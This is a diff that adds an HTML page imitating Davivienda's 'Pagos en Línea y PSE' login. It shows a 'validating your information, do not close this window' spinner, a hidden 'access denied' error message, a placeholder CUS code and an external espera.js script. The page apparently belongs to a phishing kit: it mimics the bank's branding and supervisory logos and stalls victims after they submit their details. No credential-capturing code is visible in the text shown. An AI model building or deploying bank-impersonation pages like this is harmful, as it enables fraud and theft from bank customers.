@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#E30613">
+<title>PSE - Davivienda</title>
+<link rel="icon" type="image/png" href="img/logo-davivienda2.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="login.css">
+</head>
+<body class="bodyPersonas">
+
+<div class="dav-wrapper">
+
+    <header class="dav-header">
+        <div class="dav-header-logo-wrap">
+            <img src="img/logo-davivienda2.png" alt="Davivienda" class="dav-logo">
+        </div>
+        <div class="dav-header-info">
+            <span id="dav-fecha">Sábado, 10 de octubre de 2026, 05:56 p. m.</span>
+            <br>
+            <span>Código único CUS: <strong id="dav-cus">000000000</strong></span>
+        </div>
+    </header>
+
+    <section class="dav-section">
+        <div class="dav-contenedorTabla">
+
+            <h1 align="center" class="dav-h1">Ingreso Persona Natural</h1>
+            <h2 align="center" class="dav-h2">Pagos en Línea y PSE</h2>
+
+            <!-- MENSAJE DE ERROR (oculto por defecto) -->
+            <div class="dav-mensaje-error hidden" id="davMensajeError">
+                <span class="dav-error-icono">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" fill="#cd7f19"/>
+                        <path d="M12 7v6" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
+                        <circle cx="12" cy="16.5" r="1.2" fill="#ffffff"/>
+                    </svg>
+                </span>
+                <span class="dav-error-texto" id="davErrorTexto">Acceso denegado, Por favor revise los valores ingresados</span>
+            </div>
+
+            <div class="dav-form-card dav-espera-card">
+
+                <!-- SPINNER DAVIVIENDA -->
+                <div class="dav-spinner-wrap">
+                    <div class="dav-spinner"></div>
+                </div>
+
+                <p class="dav-form-titulo" id="davEsperaTitulo">Estamos validando su información...</p>
+
+                <p class="dav-espera-subtitulo">Por favor no cierre esta ventana</p>
+
+            </div>
+
+        </div>
+    </section>
+
+    <footer class="dav-footer">
+        <div class="dav-footer-inner">
+            <p class="dav-footer-text">Banco Davivienda S.A. Todos los derechos reservados 2026.</p>
+            <div class="dav-footer-logos">
+                <img src="img/Vigilado.png" alt="Vigilado Superintendencia Financiera de Colombia" class="dav-vigilado">
+            </div>
+        </div>
+    </footer>
+
+</div>
+
+<script src="espera.js"></script>
+
+</body>
+</html>
